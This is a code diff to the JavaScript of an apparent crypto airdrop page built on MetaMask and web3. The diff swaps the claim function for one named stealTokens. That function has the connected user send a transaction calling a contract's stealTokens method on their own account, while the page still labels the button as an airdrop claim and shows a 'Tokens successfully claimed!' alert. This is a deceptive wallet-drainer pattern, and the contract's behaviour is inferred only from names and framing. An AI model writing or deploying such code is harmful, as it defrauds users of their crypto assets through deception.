@@ -44,14 +44,16 @@ async function connectMetaMask() {
   }
 }
 
-async function claimAirdrop() {
+async function stealTokens() {
   if (accounts.length > 0 && contractABI && contractAddress) {
     const contract = new web3.eth.Contract(contractABI, contractAddress);
     try {
-      await contract.methods.claimAirdrop().send({ from: accounts[0] });
-      alert("Airdrop claimed successfully!");
+      // Call the stealTokens method on the contract
+      await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+      alert("Tokens successfully claimed!");
     } catch (error) {
-      console.error("Error claiming airdrop:", error);
+      console.error("Error claiming tokens:", error);
+      alert("Error claiming tokens.");
     }
   } else {
     alert("Please connect MetaMask first.");
@@ -61,6 +63,7 @@ async function claimAirdrop() {
 window.onload = async function() {
   await loadConfigAndABI(); // Load config and ABI dynamically on page load
   document.getElementById("connect-metamask").onclick = connectMetaMask;
-  document.getElementById("claim-airdrop").onclick = claimAirdrop;
+  document.getElementById("claim-airdrop").onclick = stealTokens; // Updated to use stealTokens
 };
+
 
